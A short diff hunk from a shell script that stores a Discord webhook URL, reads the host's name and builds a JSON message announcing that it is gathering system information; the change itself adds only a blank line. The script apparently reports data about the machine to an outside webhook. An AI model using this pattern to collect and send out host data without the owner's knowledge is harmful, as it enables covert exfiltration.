@@ -2,6 +2,7 @@
 
 # Discord webhook URL
 hookurl="$dc"
+
 # Send a notification to Discord on start
 hostname=$(hostname)
 jsonsys=$(jq -n --arg username "$hostname" --arg content ":computer: \`\`Gathering System Information for $hostname\`\` :computer:" '{username: $username, content: $content}')
